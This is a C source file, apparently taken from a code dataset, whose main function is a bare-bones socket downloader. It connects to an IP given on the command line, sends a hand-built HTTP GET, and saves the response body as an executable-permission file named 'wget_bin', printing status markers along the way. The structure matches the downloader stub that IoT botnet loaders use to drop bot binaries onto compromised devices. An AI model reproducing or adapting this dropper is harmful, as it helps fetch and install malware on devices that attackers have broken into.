
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


struct TYPE_2__ {int s_addr; } ;
struct sockaddr_in {TYPE_1__ sin_addr; int sin_port; int sin_family; } ;
typedef int recvbuf ;


 int AF_INET ;
 char* DOWNLOAD_MSG ;
 int DOWNLOAD_MSG_LEN ;
 char* EXEC_MSG ;
 int EXEC_MSG_LEN ;
 int HTONS (int) ;
 int O_CREAT ;
 int O_TRUNC ;
 int O_WRONLY ;
 int SOCK_STREAM ;
 int STDOUT ;
 int __exit (int) ;
 int close (int) ;
 int connect (int,struct sockaddr_in*,int) ;
 int inet_addr (char*) ;
 int open (char*,int,int) ;
 int printf (char*) ;
 int read (int,char*,int) ;
 int socket (int ,int ,int ) ;
 int strlen (char*) ;
 int write (int,char*,int) ;

int main(int argc, char **args)
{
    char recvbuf[128];
    struct sockaddr_in addr;
    int sfd, ffd;
    unsigned int header_parser = 0;

    write(STDOUT, EXEC_MSG, EXEC_MSG_LEN);

    addr.sin_family = AF_INET;
    addr.sin_port = HTONS(80);
    addr.sin_addr.s_addr = inet_addr(args[1]);

    ffd = open("wget_bin", O_WRONLY | O_CREAT | O_TRUNC, 0777);
    sfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sfd == -1 || ffd == -1)
        __exit(1);

    if (connect(sfd, &addr, sizeof (struct sockaddr_in)) == -1)
        __exit(2);

    write(sfd, "GET ", 4);
    write(sfd, args[2], strlen(args[2]));
    write(sfd, " HTTP/1.1\r\n", 11);
    write(sfd, "Host: ", 6);
    write(sfd, args[3], strlen(args[3]));
    write(sfd, "\r\nConnection: close\r\n\r\n", 23);

    while (header_parser != 0x0d0a0d0a)
    {
        char ch;
        int ret = read(sfd, &ch, 1);

        if (ret != 1)
            __exit(4);
        header_parser = (header_parser << 8) | ch;
    }




    while (1)
    {
        int ret = read(sfd, recvbuf, sizeof (recvbuf));

        if (ret <= 0)
            break;
        write(ffd, recvbuf, ret);
    }

    close(sfd);
    close(ffd);
    write(STDOUT, DOWNLOAD_MSG, DOWNLOAD_MSG_LEN);
    __exit(5);
}
